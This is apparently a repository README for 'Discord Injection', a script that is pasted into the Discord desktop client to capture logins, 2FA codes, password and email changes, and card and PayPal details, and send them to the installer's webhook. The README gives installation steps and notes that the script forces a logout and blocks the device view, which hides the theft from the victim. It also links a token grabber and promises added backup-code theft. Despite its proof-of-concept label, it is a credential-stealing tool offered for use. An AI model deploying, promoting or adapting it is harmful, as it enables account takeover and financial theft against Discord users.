<h1 align="center">Discord Injection</h1>

<p align="center">Proof of Concept (PoC) for Intercepting HTTP Requests in Discord</p>

## Overview
Discord Injection is a demonstration of intercepting various HTTP requests within the Discord application. This PoC provides insights into potential vulnerabilities and the interception of critical actions.

- If this repository reaches 50 Star ⭐ I add backup codes and security codes 

## Key Features
- Intercept login, register, and 2FA login requests
- Intercept email/password change requests
- Intercept credit card/PayPal addition
- Automatic logout after initial injection
- QR Code login prevention
- Block requests to view devices

## Installation Guide
1. Close Discord completely
2. Copy the [injection code](https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js) into your Discord desktop core:

    ```
    %APPDATA%\Local\Discord\app-<app-version>\modules\discord_desktop_core-<core-version>\discord_desktop_core\index.js
    ```

3. Replace `%WEBHOOK%` with your Discord webhook. The intercepted information will be sent to this webhook.
4. Restart Discord

# Mode
- If you want to use the **injector** based on Nodejs and with many features, enter [here](https://github.com/k4itrun/DiscordTokenGrabber) it is free

### Note
Use this PoC responsibly and only on applications and systems you have explicit permission to test. Unauthorized use may violate terms of service and legal agreements.
